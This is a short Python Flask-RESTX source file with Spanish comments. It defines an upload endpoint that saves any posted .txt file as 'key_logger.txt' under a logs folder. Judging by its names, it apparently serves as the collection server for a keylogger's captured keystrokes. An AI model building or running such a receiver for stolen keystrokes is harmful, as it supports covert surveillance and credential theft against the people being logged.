from flask import request, Response
from flask_restx import Resource
import os
from ..logs.logger import get_logger

# Configuración del logger
logger = get_logger(__name__)

class KLtxt(Resource):
    def post(self):
        try:
            if 'file' not in request.files:
                logger.error("No se ha enviado ningun archivo")
                return Response(response="No se ha enviado ningun archivo", status=400)
            
            file = request.files['file']
            
            if file.filename == '':
                logger.error("No se ha proporcionado un archivo valido")
                return Response(response="No se ha proporcionado un archivo valido", status=400)
            
            if file and file.filename.endswith('.txt'):
                file_content = file.read()

                filename = "key_logger.txt"
                current_dir = os.path.dirname(__file__)
                parent_dir = os.path.dirname(current_dir)
                path = os.path.join(parent_dir, "logs/key_logger")

                if not os.path.exists(path):
                    os.makedirs(path)
                    logger.info(f"La carpeta '{path}' se ha creado correctamente.")
                else:
                    logger.info(f"La carpeta '{path}' ya existe.")

                filepath = os.path.join(path,filename)

                with open(filepath,"wb") as f:
                    f.write(file_content)
                
                logger.info("Archivo recibido y procesado exitosamente")
                return Response(response="Archivo recibido y procesado exitosamente", status=200)
            else:
                logger.error("El archivo proporcionado no es un archivo .txt válido")
                return Response(response="El archivo proporcionado no es un archivo .txt válido", status=400)
        except Exception as e:
            logger.error(f"Error al procesar la solicitud: {str(e)}")
            return Response(response="Se produjo un error al procesar la solicitud", status=500)




